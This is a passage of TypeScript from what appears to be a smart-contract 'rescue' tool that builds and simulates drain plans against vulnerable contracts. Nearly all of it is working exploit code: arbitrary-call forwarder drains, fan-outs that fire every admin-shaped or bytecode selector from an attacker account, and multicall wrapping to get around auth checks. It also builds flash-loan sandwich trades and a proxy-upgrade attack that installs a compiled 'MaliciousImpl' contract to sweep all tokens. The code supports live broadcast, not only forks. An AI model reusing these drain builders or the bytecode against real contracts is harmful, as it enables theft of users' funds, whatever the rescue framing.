      ruleFamily !== "withdraw-replay" &&
      ruleFamily !== "access"
    ) {
      notes.push(
        `Rule family '${ruleFamily}' is partially supported by rescue-prove@5 (only via the ` +
          `admin-name heuristic). Verdict reflects best-effort.`,
      );
    }

    // Surface plan-builder notes (weth-unwrap prepend, heuristic candidate
    // count, etc.) into the PoE so the operator sees what strategies were tried.
    if (planResult.ok && Array.isArray((planResult as any).notes)) {
      for (const n of (planResult as any).notes as string[]) notes.push(n);
    }
    if (approvalScan && approvalScan.notes.length > 0) {
      for (const n of approvalScan.notes) notes.push(`v3-A: ${n}`);
    }
    // List FOT-affected assets in notes so operators can see why amounts
    // differ from the nominal contract balance.
    for (const [addr, q] of tokenQuirks) {
      if (q.kind === "fee-on-transfer" && q.feeBps != null) {
        const sym = pre.tokens.find((t) => t.address.toLowerCase() === addr)?.symbol ?? addr.slice(0, 10);
        notes.push(
          `v3-Q: ${sym} is fee-on-transfer (${(q.feeBps / 100).toFixed(2)}% tax). ` +
            `Delivered ${q.deliverableAmount} of ${q.attemptedAmount} attempted.`,
        );
      }
    }

    return finalise({
      attemptId,
      input,
      verdict,
      assets,
      plan,
      pre: snapStateFromLive(pre),
      post: snapStateFromLive(post),
      notes,
      blockNumber,
      error: null,
      startedAt,
      approvalVictims: approvalVictimsPoe,
      trappedAssets,
      flashloanRequirement:
        verdict === "requires_flashloan_helper"
          ? {
              asset: pre.nativeSymbol,
              amount: (planResult.ok && (planResult as any).sandwichBorrowAmount)
                ? (planResult as any).sandwichBorrowAmount
                : "100000000000000000000",
              suggestedPool: aaveV3PoolFor(input.chainId),
              notes: [
                flashloanReceiverFor(input.chainId)
                  ? `RECEIVER CONFIGURED: ${flashloanReceiverFor(input.chainId)} — the broadcaster ` +
                    `routes this PoE through the deployed receiver via executeRescue(...) from the ` +
                    `attacker EOA.`
                  : "No receiver configured. Stub uses anvil_setBalance to grant capital on the fork; " +
                    "for live rescue, deploy contracts/rescue/FlashLoanRescue.sol and register the " +
                    "address in RESCUE_FLASHLOAN_RECEIVER.",
              ],
            }
          : null,
    });
  } catch (err: any) {
    return finalise({
      attemptId,
      input,
      verdict: "error",
      assets: [],
      plan: [],
      pre: emptyState(),
      post: emptyState(),
      notes: [],
      blockNumber: null,
      error: String(err?.message ?? err).slice(0, 800),
      startedAt,
    });
  } finally {
    if (unlock) unlock();
  }
}

// ---- drain-plan builder ----------------------------------------------------

// v5: drain is always sent from the attacker EOA. Owner-only findings are
// rejected upfront (no_rescue_possible) so we never even build a plan for
// them. This keeps the executor model honest: rescue = frontrun-the-attacker.

type DrainStep = {
  to: string;
  data: string;
  value: string; // decimal wei
  asset: string;
  /** Human-readable "why this step is in the plan", e.g. "weth-unwrap" or
   *  "transferFrom self-allowance fallback" — surfaces in the PoE notes. */
  strategy: string;
};

function ruleFamilyOf(
  ruleId: string,
):
  | "arbitrary-call"
  | "selfdestruct"
  | "initializer"
  | "economic"
  | "access"
  | "proxy-upgrade"
  | "bridge"
  | "erc4626-withdraw"
  | "withdraw-replay"
  | "other" {
  if (ruleId.startsWith("call.")) return "arbitrary-call";
  if (ruleId.startsWith("control.unguarded_selfdestruct")) return "selfdestruct";
  if (ruleId.startsWith("init.")) return "initializer";
  if (ruleId.startsWith("economic.")) return "economic";
  if (ruleId.startsWith("access.")) return "access";
  if (ruleId.startsWith("proxy.")) return "proxy-upgrade";
  if (ruleId.startsWith("bridge.")) return "bridge";
  if (ruleId.startsWith("logic.")) return "withdraw-replay";
  if (ruleId === "defi.erc4626.withdraw.missing_caller_authorization")
    return "erc4626-withdraw";
  return "other";
}

async function buildDrainPlan(
  input: RescueProveInput,
  exposure: Exposure,
  url: string,
): Promise<{ ok: true; steps: DrainStep[]; notes: string[]; sandwichBorrowAmount?: string } | { ok: false; notes: string[] }> {
  const fam = ruleFamilyOf(input.ruleId);
  const notes: string[] = [];
  const steps: DrainStep[] = [];
  let sandwichBorrowAmount: string | undefined;

  // 1. Primary path: rule-family-specific drain shape from the verifier's
  //    own witnessed evidence.
  if (fam === "arbitrary-call") {
    const s = buildArbitraryCallDrain(input, exposure, notes);
    steps.push(...s);
  } else if (fam === "selfdestruct") {
    const s = buildSelfdestructDrain(input, exposure, notes);
    steps.push(...s);
  } else if (fam === "initializer") {
    // v3-Init: phase-1 init-takeover step prepended; phase-2 is the
    // admin-name heuristic which runs below for ALL families.
    const phase1 = buildInitTakeoverPhase1({
      contractAddress: input.contractAddress,
      attacker: RESCUER_ADDRESS,
      evidence: input.evidence,
    });
    if (phase1) {
      // Confirm the takeover is still viable RIGHT NOW (cached verifier
      // evidence may be stale if the proxy was re-initialised between
      // verifier run and rescue-prove run).
      const valid = await probeInitTakeoverIsStillValid(
        url,
        RESCUER_ADDRESS,
        input.contractAddress,
        phase1,
      );
      if (valid.valid) {
        steps.push({
          to: phase1.to,
          data: phase1.data,
          value: phase1.value,
          asset: phase1.asset,
          strategy: phase1.strategy,
        });
        notes.push(
          `v3-Init: init-takeover phase-1 step prepended (${valid.detail}). ` +
            `Phase-2 admin-name drain will run from the attacker EOA which is now owner.`,
        );
      } else {
        notes.push(
          `v3-Init: cached evidence pointed to an init-takeover but it no longer reproduces on a ` +
            `fresh fork (${valid.detail}). Skipping phase-1; admin-name heuristic only.`,
        );
      }
    } else {
      notes.push(
        `v3-Init: rule family is initializer but evidence didn't expose a successful viaSelector + ` +
          `positionTried; can't replay phase-1.`,
      );
    }
  } else if (fam === "proxy-upgrade") {
    const proxySteps = await buildProxyUpgradeDrain(input, exposure, url, notes);
    steps.push(...proxySteps);
  } else if (fam === "bridge") {
    const bridgeSteps = buildBridgeProofDrain(input, exposure, notes);
    steps.push(...bridgeSteps);
  } else if (fam === "erc4626-withdraw") {
    const vaultSteps = buildErc4626WithdrawDrain(input, exposure, notes);
    steps.push(...vaultSteps);
  } else if (fam === "withdraw-replay") {
    const replaySteps = buildWithdrawReplayDrain(input, exposure, notes);
    steps.push(...replaySteps);
  } else if (fam === "access") {
    const accessSteps = buildFlashloanCallbackDrain(input, exposure, notes);
    steps.push(...accessSteps);
  } else if (fam === "economic") {
    // v3-FL: economic.* on-fork stub. Grant flash capital, then run the
    // admin-name heuristic (rare for economic, but the verifier may have
    // landed on a contract that has BOTH economic + admin surfaces).
    if (shouldUseFlashloanStub(input.ruleId)) {
      const grant = await grantFlashCapital({
        url,
        attacker: RESCUER_ADDRESS,
        chainId: input.chainId,
      });
      for (const n of grant.notes) notes.push(`v3-FL: ${n}`);
      const receiverWired = flashloanReceiverFor(input.chainId);
      notes.push(
        receiverWired
          ? `v3-FL: receiver wired at ${receiverWired}. Drain plan is candidate-only — these are the ` +
              `selectors the verifier flagged but couldn't fire on a bare fork (missing flash-loan-` +
              `induced pair imbalance). Live broadcast routes them through the receiver inside the ` +
              `flash-loan callback so the pair is mid-flash when each step lands; pre-flight will ` +
              `prune the ones that still revert.`
          : `v3-FL: economic exploits need a deployed flash-loan receiver contract for LIVE rescue. ` +
              `Our on-fork stub uses anvil_setBalance to grant capital — proves drainability but live ` +
              `broadcast will be refused (verdict: requires_flashloan_helper).`,
      );
    }
    // v8: economic-candidate drain. Build one step per verifier-attempted
    // selector from the original evidence so force-rescue has something to
    // fire. These are speculative (they reverted on a bare fork) but with
    // a deployed receiver they execute inside the flash-loan callback
    // where the pair state can be manipulated; live pre-flight prunes the
    // unsalvageable ones.
    const econ = buildEconomicCandidateDrain(input, exposure, notes);
    for (const s of econ) steps.push(s);

    // v12: sandwich-aware drain plan. Discover the relevant pair and wrap
    // the candidate steps with front-run (buy) and back-run (sell) steps.
    // The receiver executes the full sequence inside the flash-loan callback,
    // creating the pair imbalance that makes the target call profitable.
    // IMPORTANT: sandwich steps go at the FRONT of the plan array so the
    // final MAX_DRAIN_STEPS slice preserves the complete sandwich envelope.
    const receiverAddr = flashloanReceiverFor(input.chainId);
    if (receiverAddr && econ.length > 0) {
      try {
        const pairInfo = await discoverPairForSandwich(
          url,
          input.chainId,
          input.contractAddress,
          input.evidence ?? {},
        );
        if (pairInfo) {
          const borrowAmount = calculateBorrowAmount(pairInfo, input.chainId);
          sandwichBorrowAmount = borrowAmount.toString();
          const targetToken = pairInfo.wethIsToken0 ? pairInfo.token1 : pairInfo.token0;
          const sandwichedSteps = wrapWithSandwich(
            econ.slice(0, 8) as SandwichStep[], // limit inner steps to keep plan focused
            {
              chainId: input.chainId,
              pairAddress: pairInfo.pairAddress,
              wethIsToken0: pairInfo.wethIsToken0,
              receiver: receiverAddr,
              borrowAmount,
              targetToken,
            },
          );
          // Prepend sandwich plan so it survives the MAX_DRAIN_STEPS slice
          steps.unshift(...sandwichedSteps);
          notes.push(
            `v12-sandwich: discovered pair ${pairInfo.pairAddress.slice(0, 10)}… ` +
              `(token0=${pairInfo.token0.slice(0, 10)}, token1=${pairInfo.token1.slice(0, 10)}, ` +
              `reserves=${formatWei(pairInfo.reserve0)}/${formatWei(pairInfo.reserve1)}). ` +
              `Built sandwich with ${formatWei(borrowAmount)} WETH borrow → ` +
              `${sandwichedSteps.length} total steps (front + ${Math.min(econ.length, 8)} candidates + back). ` +
              `The receiver's executeRescue will execute this sequence inside the flash callback.`,
          );
        } else {
          notes.push(
            `v12-sandwich: could not discover a viable UniV2-style pair for sandwich construction. ` +
              `Bare candidate steps remain in the plan (will likely revert without pair manipulation).`,
          );
        }
      } catch (err: any) {
        notes.push(
          `v12-sandwich: pair discovery failed: ${String(err?.message ?? err).slice(0, 100)}`,
        );
      }
    }
  }

  // 2. Heuristic admin-name selector discovery (v2-H). Even if we got
  //    witnessed-attempt steps above, we ADD heuristic candidates as
  //    extra fallbacks, because the witness path may have proved one
  //    forwarder shape but the contract may also have a dedicated
  //    `withdraw`/`rescue`/`sweep` admin path that's easier to drain. For
  //    rule families WITHOUT a v1 builder (initializer/economic/access),
  //    these are the only steps in the plan.
  try {
    const heuristic = await buildAdminHeuristicDrain(input, exposure, url, notes);
    for (const h of heuristic) steps.push(h);
  } catch (e) {
    notes.push(
      `admin-name heuristic scan failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
    );
  }

  // 2b. v8-Evidence-Admin: the verifier's static analysis already resolved
  //     EVERY function selector the contract exposes, along with its real
  //     argTypes (from 4byte / static signature DB). The hardcoded
  //     ADMIN_DRAIN_SIGS table catches the common canonical shapes but
  //     misses contract-specific variants — e.g. the production corpus
  //     contains `withdrawETH(address,uint256)` whose selector collides
  //     with the table's `withdrawETH(address)` so we historically built
  //     calldata with the wrong arg count and reverted.
  //
  //     This fanout uses the VERIFIER'S resolved argTypes (always correct
  //     for the actual contract) and fires every admin-shaped selector as
  //     a direct attacker-EOA call. Owner-gated ones revert on pre-flight
  //     and get pruned; permissive ones land. This is the path that
  //     catches "rescue-shaped function that's accidentally world-callable".
  try {
    const evidenceFanout = buildEvidenceAdminFanout(input, exposure, notes);
    for (const s of evidenceFanout) steps.push(s);
  } catch (e) {
    notes.push(
      `v8-evidence-admin fanout failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
    );
  }

  // 2c. v11-BSFANOUT: bytecode selector fanout. Extract ALL 4-byte function
  //     selectors PUSHed in the contract bytecode and try each with
  //     attacker-favoured arg templates. The evidence-admin fanout above
  //     only fires on named selectors matching ADMIN_NAME_PATTERN; this
  //     catches contract-specific drain functions with non-obvious names
  //     like `execute`, `dispatch`, `forward`, `process`, etc.
  try {
    const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
      () => "0x",
    );
    const bsfSteps = buildBytecodeSelectorFanout(input, exposure, code, notes);
    for (const s of bsfSteps) steps.push(s);
  } catch (e) {
    notes.push(
      `v11-bytecode-selector fanout failed: ${String((e as any)?.message ?? e).slice(0, 120)}`,
    );
  }

  // 3. WETH-unwrap pre-step (v2-C). If the contract holds the canonical
  //    wrapped-native and we have an arbitrary-call forwarder shape, the
  //    forwarder can be re-targeted at WETH.withdraw(balance) which
  //    converts to native inside the contract. We insert these AT THE
  //    FRONT of the plan so the resulting native shows up before the
  //    native-drain step.
  if (fam === "arbitrary-call") {
    const wethSteps = buildWethUnwrapSteps(input, exposure);
    if (wethSteps.length > 0) {
      notes.push(
        `prepended ${wethSteps.length} wrapped-native unwrap step(s) — contract holds ` +
          `${exposure.tokens.find((t) => t.address.toLowerCase() === (WRAPPED_NATIVE_BY_CHAIN[input.chainId] ?? "").toLowerCase())?.symbol ?? "WETH"}`,
      );
      steps.unshift(...wethSteps);
    }
  }

  // 4. v3-Multi: multi-arg fanout — when the witnessed selector has >=2
  //    address slots and the verifier only substituted one, generate
  //    extra variants that substitute (token, escrow) at every distinct
  //    pair of slots. Catches forwarders that gate on a secondary
  //    "recipient" or "approved user" argument.
  if (fam === "arbitrary-call") {
    const fanoutSteps = buildMultiArgFanoutSteps(input, exposure);
    if (fanoutSteps.length > 0) {
      notes.push(
        `v3-Multi: ${fanoutSteps.length} multi-arg fanout variant(s) added (forwarder has ≥2 ` +
          `address slots; trying every (token, escrow) pair).`,
      );
      steps.push(...fanoutSteps);
    }
  }

  // 5. v3-MC: multicall envelope wrap. If the contract bytecode PUSHes a
  //    multicall selector, ALSO emit a wrapped variant of each existing
  //    drain step. The wrapped variant lets us bypass per-function
  //    auth checks on contracts that only allow drain-shaped calls
  //    through the multicall surface.
  try {
    const code = await rpcRequest<string>(url, "eth_getCode", [input.contractAddress, "latest"]).catch(
      () => "0x",
    );
    const surfaces = detectMulticallSurfaces(code);
    if (surfaces.length > 0 && steps.length > 0) {
      const wrappedCount = wrapStepsInMulticall(steps, surfaces, notes);
      if (wrappedCount > 0) {
        notes.push(
          `v3-MC: ${wrappedCount} multicall-wrapped variant(s) appended (contract exposes ` +
            `${surfaces.map((s) => s.signature).join(" / ")}).`,
        );
      }
    }
  } catch (e) {
    notes.push(`multicall envelope detection failed: ${String((e as any)?.message ?? e).slice(0, 100)}`);
  }

  if (steps.length === 0) {
    notes.unshift(
      `no rescuable drain shape found for rule family '${fam}'. ` +
        (fam === "arbitrary-call"
          ? `(no witnessed forwarder attempt + no admin-named selectors PUSHed in bytecode)`
          : fam === "selfdestruct"
            ? `(selfdestruct evidence missing selector)`
            : fam === "initializer"
              ? `(init phase-1 unviable AND no admin-named selectors)`
              : fam === "economic"
                ? `(economic exploits need flash-loan helper; on-fork stub didn't find an admin surface either)`
                : fam === "proxy-upgrade"
                  ? `(upgradeTo pre-flight reverted or proxy holds no drainable value; admin-name heuristic also empty)`
                  : `(rescue-prove v3 doesn't yet cover this rule family — verdict reflects best-effort heuristic only)`),
    );
    return { ok: false, notes };
  }
  return { ok: true, steps: steps.slice(0, MAX_DRAIN_STEPS), notes, sandwichBorrowAmount };
}

/** Wrap each drain step in the FIRST detected multicall envelope. Returns
 *  the number of wrapped variants APPENDED (the originals are kept
 *  in-place — the wrapped version is just one more candidate the
 *  executor tries). Mutates `steps` in place. */
function wrapStepsInMulticall(
  steps: DrainStep[],
  surfaces: ReturnType<typeof detectMulticallSurfaces>,
  _notes: string[],
): number {
  if (surfaces.length === 0 || steps.length === 0) return 0;
  const surface = surfaces[0]; // first match — usually multicall(bytes[])
  const contract = steps[0].to;
  const beforeLen = steps.length;
  const original = steps.slice(0, Math.min(8, beforeLen)); // bound expansion
  for (const s of original) {
    if (s.to.toLowerCase() !== contract.toLowerCase()) continue;
    try {
      const wrapped = surface.wrap([s.data]);
      steps.push({
        to: contract,
        data: wrapped,
        value: s.value,
        asset: `${s.asset} via ${surface.signature}`,
        strategy: `multicall-wrap+${s.strategy}`,
      });
    } catch {
      /* skip un-wrappable */
    }
  }
  return steps.length - beforeLen;
}

/** v3-Multi: multi-arg fanout for arbitrary-call witnessed attempts. For
 *  each (selector, hitPos) with ≥2 address slots in the signature, emit
 *  drain calldata where TWO addresses are substituted (token at one slot,
 *  escrow at another). Bounded by multi-arg-fanout MAX_FANOUT_VARIANTS. */
function buildMultiArgFanoutSteps(input: RescueProveInput, exposure: Exposure): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts: any[] = Array.isArray((ev as any).attempts) ? (ev as any).attempts : [];
  const hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );
  if (hits.length === 0) return [];

  const subs = exposure.tokens
    .filter((t) => t.balance && t.balance !== "0")
    .slice(0, 4)
    .map((t) => ({ token: t.address, escrow: DEFAULT_ESCROW, amount: BigInt(t.balance) }));
  if (subs.length === 0) return [];

  const out: DrainStep[] = [];
  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    if (argTypes.length === 0) continue;
    const addressCount = argTypes.filter((t) => t === "address").length;
    if (addressCount < 2) continue;
    const variants = multiArgFanout({
      selector,
      argTypes,
      substitutions: subs,
      filler: RESCUER_ADDRESS,
    });
    for (const v of variants) {
      out.push({
        to: input.contractAddress,
        data: v.calldata,
        value: "0",
        asset: `multi-arg fanout — ${v.shape}`,
        strategy: `multi-arg-fanout sel=${selector} ${v.shape}`,
      });
    }
  }
  return out;
}

// Find the witnessed forwarder attempts in the verifier evidence and use
// ---------------------------------------------------------------------------
// v10: proxy-upgrade drain shape.
//
// Strategy: inject a minimal "MaliciousImpl" contract (compiled from
// contracts/rescue/MaliciousImpl.sol) at a deterministic address on the
// fork via anvil_setCode. Call upgradeTo(maliciousImpl) from the attacker
// EOA. Then call proxy.drainAll(tokens, escrow) which delegatecalls into
// the injected code, sweeping all ERC-20 + native to the escrow.
//
// Pre-flight: before building any drain steps, we simulate
// eth_call(upgradeTo(0xdead)) from the attacker EOA. If that reverts
// (admin-gated), the proxy is NOT attacker-drainable — we skip with a
// diagnostic note and let the admin-name heuristic below try the
// generic approach.
// ---------------------------------------------------------------------------

const MALICIOUS_IMPL_ADDRESS_FORK = "0x00000000000000000000000000000000DeadC0de";

// For live broadcast, we need MaliciousImpl deployed on-chain. Format same as
// RESCUE_FLASHLOAN_RECEIVER: comma-separated chainId:address pairs.
// e.g. RESCUE_MALICIOUS_IMPL=1:0x...,10:0x...,56:0x...
function maliciousImplFor(chainId: number): string | null {
  const raw = process.env.RESCUE_MALICIOUS_IMPL ?? "";
  if (!raw) return null;
  for (const entry of raw.split(",")) {
    const [cid, addr] = entry.split(":");
    if (Number(cid) === chainId && addr) return addr.toLowerCase();
  }
  return null;
}

// Runtime bytecode of MaliciousImpl.sol — compiled with solc 0.8.26.
// drainAll(address[],address) selector = 0x568fbbdb
// Uses low-level staticcall/call so non-compliant ERC-20s (missing return
// value, fee-on-transfer, etc.) don't revert the entire drain.
// Loaded from the adjacent .hex file to avoid manual hex-splitting errors.
const MALICIOUS_IMPL_BYTECODE = "0x60806040526004361061002c575f3560e01c806352d1902d14610037578063568fbbdb1461006157610033565b3661003357005b5f80fd5b348015610042575f80fd5b5061004b610089565b60405161005891906103c1565b60405180910390f35b34801561006c575f80fd5b506100876004803603810190610082919061049d565b6100b2565b005b5f7f360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc5f1b905090565b5f5b838390508110156102ec575f808585848181106100d4576100d36104fa565b5b90506020020160208101906100e99190610562565b73ffffffffffffffffffffffffffffffffffffffff166370a0823130604051602401610115919061059c565b6040516020818303038152906040529060e01b6020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506040516101639190610607565b5f60405180830381855afa9150503d805f811461019b576040519150601f19603f3d011682016040523d82523d5f602084013e6101a0565b606091505b50915091508115806101b3575060208151105b156101bf5750506102df565b5f818060200190518101906101d49190610650565b90505f81036101e5575050506102df565b5f8787868181106101f9576101f86104fa565b5b905060200201602081019061020e9190610562565b73ffffffffffffffffffffffffffffffffffffffff1663a9059cbb878460405160240161023c929190610699565b6040516020818303038152906040529060e01b6020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505060405161028a9190610607565b5f604051808303815f865af19150503d805f81146102c3576040519150601f19603f3d011682016040523d82523d5f602084013e6102c8565b606091505b50509050806102da57505050506102df565b505050505b80806001019150506100b4565b505f4790505f8111156103a3575f8273ffffffffffffffffffffffffffffffffffffffff168260405161031e906106e3565b5f6040518083038185875af1925050503d805f8114610358576040519150601f19603f3d011682016040523d82523d5f602084013e61035d565b606091505b50509050806103a1576040517f08c379a000000000000000000000000000000000000000000000000000000000815260040161039890610751565b60405180910390fd5b505b50505050565b5f819050919050565b6103bb816103a9565b82525050565b5f6020820190506103d45f8301846103b2565b92915050565b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f80fd5b5f8083601f840112610403576104026103e2565b5b8235905067ffffffffffffffff8111156104205761041f6103e6565b5b60208301915083602082028301111561043c5761043b6103ea565b5b9250929050565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61046c82610443565b9050919050565b61047c81610462565b8114610486575f80fd5b50565b5f8135905061049781610473565b92915050565b5f805f604084860312156104b4576104b36103da565b5b5f84013567ffffffffffffffff8111156104d1576104d06103de565b5b6104dd868287016103ee565b935093505060206104f086828701610489565b9150509250925092565b7f4e487b71000000000000000000000000000000000000000000000000000000005f52603260045260245ffd5b5f61053182610443565b9050919050565b61054181610527565b811461054b575f80fd5b50565b5f8135905061055c81610538565b92915050565b5f60208284031215610577576105766103da565b5b5f6105848482850161054e565b91505092915050565b61059681610527565b82525050565b5f6020820190506105af5f83018461058d565b92915050565b5f81519050919050565b5f81905092915050565b8281835e5f83830152505050565b5f6105e1826105b5565b6105eb81856105bf565b93506105fb8185602086016105c9565b80840191505092915050565b5f61061282846105d7565b915081905092915050565b5f819050919050565b61062f8161061d565b8114610639575f80fd5b50565b5f8151905061064a81610626565b92915050565b5f60208284031215610665576106646103da565b5b5f6106728482850161063c565b91505092915050565b61068481610462565b82525050565b6106938161061d565b82525050565b5f6040820190506106ac5f83018561067b565b6106b9602083018461068a565b9392505050565b50565b5f6106ce5f836105bf565b91506106d9826106c0565b5f82019050919050565b5f6106ed826106c3565b9150819050919050565b5f82825260208201905092915050565b7f6e6174697665207472616e73666572206661696c6564000000000000000000005f82015250565b5f61073b6016836106f7565b915061074682610707565b602082019050919050565b5f6020820190508181035f8301526107688161072f565b905091905056fea2646970667358221220ef57dbdd6c38c8083138fd82b7d9e9e9abf488386dbc51730980a0a355f092f964736f6c634300081a0033"; // prettier-ignore

const UPGRADE_TO_SELECTOR = "0x3659cfe6"; // upgradeTo(address)
const DRAIN_ALL_SELECTOR = "0x568fbbdb"; // drainAll(address[],address)

async function buildProxyUpgradeDrain(
  input: RescueProveInput,
  exposure: Exposure,
  url: string,
  notes: string[],
): Promise<DrainStep[]> {
  // Use on-chain deployed address if available; otherwise fork-only address.
  const liveImpl = maliciousImplFor(input.chainId);
  const implAddr = liveImpl ?? MALICIOUS_IMPL_ADDRESS_FORK;

  // Pre-flight: can the ATTACKER call upgradeTo on this proxy?
  // If it reverts, the proxy has a runtime admin guard => not attacker-drainable.
  const preflightData =
    UPGRADE_TO_SELECTOR +
    "000000000000000000000000" +
    implAddr.slice(2).toLowerCase();
  try {
    await rpcRequest(url, "eth_call", [
      { from: RESCUER_ADDRESS, to: input.contractAddress, data: preflightData },
      "latest",
    ]);
  } catch {
    notes.push(
      `proxy-upgrade pre-flight: upgradeTo() from attacker EOA reverts — proxy has a runtime admin ` +
        `guard. Owner-only rug-pull risk, not attacker-drainable. Falling through to admin-name heuristic.`,
    );
    return [];
  }

  // Inject the MaliciousImpl bytecode at the target address on the fork.
  await rpcRequest(url, "anvil_setCode", [implAddr, MALICIOUS_IMPL_BYTECODE]);

  // Step 1: upgradeTo(implAddr) — swap the proxy's impl pointer.
  const upgradeCalldata =
    UPGRADE_TO_SELECTOR +
    "000000000000000000000000" +
    implAddr.slice(2).toLowerCase();

  const steps: DrainStep[] = [
    {
      to: input.contractAddress,
      data: upgradeCalldata,
      value: "0",
      asset: "proxy-impl-swap",
      strategy: "proxy-upgrade:upgradeTo",
    },
  ];

  // Step 2: drainAll(tokens[], escrow) — called on the PROXY (which now
  // delegatecalls into MaliciousImpl). We pass every token the proxy holds.
  const tokenAddrs = exposure.tokens
    .filter((t) => t.balance && BigInt(t.balance) > 0n)
    .map((t) => t.address.toLowerCase());

  // ABI-encode drainAll(address[],address)
  const escrow = DEFAULT_ESCROW.slice(2).toLowerCase().padStart(64, "0");
  // Dynamic array: offset, then length, then each element
  const offsetToArray = (64).toString(16).padStart(64, "0"); // offset to tokens array = 0x40
  const arrayLen = tokenAddrs.length.toString(16).padStart(64, "0");
  const elements = tokenAddrs.map((a) => a.slice(2).padStart(64, "0")).join("");
  const drainCalldata =
    DRAIN_ALL_SELECTOR +
    offsetToArray +
    escrow +
    arrayLen +
    elements;

  steps.push({
    to: input.contractAddress,
    data: drainCalldata,
    value: "0",
    asset: `drain-all (${tokenAddrs.length} token(s) + native)`,
    strategy: "proxy-upgrade:drainAll",
  });

  notes.push(
    `v10-Proxy: injected MaliciousImpl at ${implAddr} via anvil_setCode. ` +
      `Plan: (1) upgradeTo(maliciousImpl) from attacker EOA, (2) drainAll(${tokenAddrs.length} ` +
      `token(s), escrow=${DEFAULT_ESCROW}). Delegatecall sweeps proxy's native + ERC-20 to escrow.` +
      (liveImpl
        ? ` LIVE-READY: MaliciousImpl deployed on chain ${input.chainId} at ${liveImpl}.`
        : ` FORK-ONLY: MaliciousImpl NOT deployed on chain ${input.chainId}. Set RESCUE_MALICIOUS_IMPL=${input.chainId}:<address> for live broadcast.`),
  );

  return steps;
}

// ---------------------------------------------------------------------------
// v1-v2: arbitrary-call drain builder. Replays the verifier's witnessed
// attempts using
// their (selector, argTypes, hitPosition) — the exact shape the verifier
// proved worked — but with the probe address slot rewritten to point at
// the rescue target and the bytes payload rewritten to be a transfer to
// the escrow. Always sent from the attacker EOA (owner-only findings are
// rejected before we get here).
//
// Per (selector, hitPos) we emit a small fan-out of candidates per asset:
//   - transfer(escrow, balance)
//   - transferFrom(self, escrow, balance)
//   - native drain with uintFiller in {balance, max, half, 0}
function buildArbitraryCallDrain(
  input: RescueProveInput,
  exposure: Exposure,
  notes: string[],
): DrainStep[] {
  const ev = input.evidence ?? {};
  const attempts = Array.isArray((ev as any).attempts) ? ((ev as any).attempts as any[]) : [];

  // First-choice: attempts the primary verifier actually witnessed firing
  // a CALL. These have proven argshape AND proven the exact (selector,
  // hitPos) the contract dispatches through.
  let hits = attempts.filter(
    (a) => a && typeof a === "object" && a.hit === true && typeof a.selector === "string",
  );

  // v5+: precondition-gap fallback. If no CALL-hit attempts exist BUT the
  // verifier saw STATICCALL forwards (rejectedWitnessKind="STATICCALL"),
  // the contract's routing surface IS proven — the only reason a drain
  // didn't fire is that the attacker EOA lacks the runtime precondition
  // (real balance / approval / signed payload) the surface checks before
  // doing a state-changing CALL. We treat these as drain candidates
  // anyway: rescue-prove sets up synthetic preconditions on the fork
  // (token balance + self-approval) and lets the drain candidates run.
  // Most will revert; the ones that succeed surface real exposure that
  // the bare on-fork prober missed.
  const STATICCALL_KIND = "STATICCALL";
  if (hits.length === 0) {
    const staticHits = attempts.filter(
      (a) =>
        a &&
        typeof a === "object" &&
        a.hit === false &&
        a.rejectedWitnessKind === STATICCALL_KIND &&
        typeof a.selector === "string",
    );
    if (staticHits.length > 0) {
      notes.push(
        `precondition-gap: verifier witnessed STATICCALL routing on ${staticHits.length} selector(s) ` +
          `(${staticHits.map((h: any) => h.resolvedName ?? h.selector).slice(0, 4).join(", ")}). ` +
          `Treating as drain candidates and prepaying synthetic preconditions on the fork.`,
      );
      // Synthesize hit-position 0 for static-witnessed attempts when not
      // explicitly recorded — most precondition-gap surfaces gate the first
      // address arg, then deliver value if the surface accepts the call.
      hits = staticHits.map((a: any) => ({
        ...a,
        hit: true,
        hitPosition: typeof a.hitPosition === "number" ? a.hitPosition : 0,
      }));
    }
  }
  if (hits.length === 0) {
    notes.push(
      "no witnessed forwarder attempt in evidence — falling back to admin-name heuristic only.",
    );
    return [];
  }

  const steps: DrainStep[] = [];
  const seen = new Set<string>();
  const push = (data: string, asset: string, strategy: string, value = "0") => {
    const key = `${input.contractAddress}|${data}|${value}`;
    if (seen.has(key)) return;
    seen.add(key);
    steps.push({
      to: input.contractAddress,
      data,
      value,
      asset,
      strategy,
    });
  };

  for (const a of hits) {
    const selector: string = a.selector;
    const argTypes: string[] = Array.isArray(a.argTypes) ? a.argTypes : [];
    const rawHitPos: number | "all" =
      typeof a.hitPosition === "number" && a.hitPosition >= 0 ? a.hitPosition : ("all" as const);
    const witnessTag = `witnessed-arbitrary-call sel=${selector}`;

    // When hitPos is "all" (or was -1/unknown), expand to individual address
    // positions so each variant only fills ONE address slot with the target token.
    const positionsToTry: number[] = rawHitPos === "all"
      ? argTypes.reduce<number[]>((acc, t, i) => { if (t === "address") acc.push(i); return acc; }, [])
      : [rawHitPos];
    if (positionsToTry.length === 0 && rawHitPos === "all") positionsToTry.push(0);

    // For functions with multiple address args (like MetaRouter's externalCall
    // which needs both `target` and `callTo` set to the token address), also
    // try filling ALL address positions at once.
    const addrPositions = argTypes.reduce<number[]>((acc, t, i) => { if (t === "address") acc.push(i); return acc; }, []);
    const tryAllAddresses = rawHitPos === "all" && addrPositions.length >= 2;

    // -- per-token drain candidates -----------------------------------------
    for (const t of exposure.tokens) {
      if (!t.balance || t.balance === "0") continue;
      const bal = BigInt(t.balance);

      for (const hitPos of positionsToTry) {
        // (1a) transfer(escrow, balance)
        const transferInner = encodeErc20Transfer(DEFAULT_ESCROW, bal);
        const cd1 = buildDrainCalldata(selector, argTypes, hitPos, t.address, transferInner, "0");
        if (cd1) push(cd1, `${t.symbol || "?"} (${t.address}) via transfer pos=${hitPos}`, witnessTag);

      // (1b) transferFrom(self, escrow, balance) — works on tokens that
      //      allow self-allowance; many vault-style contracts have
